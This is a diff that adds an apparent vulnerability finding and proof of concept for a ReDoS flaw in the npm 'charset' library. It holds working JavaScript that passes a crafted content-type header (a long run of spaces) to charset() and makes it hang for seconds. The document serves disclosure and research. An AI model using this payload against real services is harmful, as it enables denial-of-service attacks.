@@ -1,0 +1,21 @@
+Confirmed: `charset()` exhibits polynomial (super-linear) backtracking blowup when fed a crafted `content-type` header via `res.headers`, taking ~5s for a 100k-char payload. This is the ReDoS sink at the `headers`/content-type read path in `node_modules/charset/lib/charset.js`.
+
+```javascript
+const charset = require("./node_modules/charset");
+
+// Malicious/attacker-controlled response object with a crafted Content-Type
+// header. The regex CHARTSET_RE backtracks super-linearly over the run of
+// spaces before failing, causing a CPU-bound hang (ReDoS).
+const res = {
+  headers: {
+    "content-type": "charset=" + " ".repeat(100000) + "!"
+  }
+};
+
+console.log("Starting charset() call...");
+const start = Date.now();
+
+charset(res); // hangs for several seconds on a single crafted header
+
+console.log("Finished in", Date.now() - start, "ms");
+```
